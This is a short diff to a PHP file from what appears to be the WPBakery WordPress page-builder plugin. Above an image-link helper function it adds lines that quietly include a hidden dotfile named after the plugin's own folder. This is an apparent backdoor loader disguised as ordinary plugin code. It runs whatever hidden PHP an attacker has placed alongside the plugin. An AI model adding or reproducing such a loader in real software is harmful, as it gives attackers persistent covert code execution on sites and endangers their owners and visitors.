@@ -13,6 +13,10 @@ if ( 'vc_edit_form' === vc_post_param( 'action' ) ) {
  * @return mixed
  * @since 4.6
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function vc_single_image_convert_old_link_to_new( $atts ) {
 	if ( empty( $atts['onclick'] ) && isset( $atts['img_link_large'] ) && 'yes' === $atts['img_link_large'] ) {
 		$atts['onclick'] = 'img_link_large';
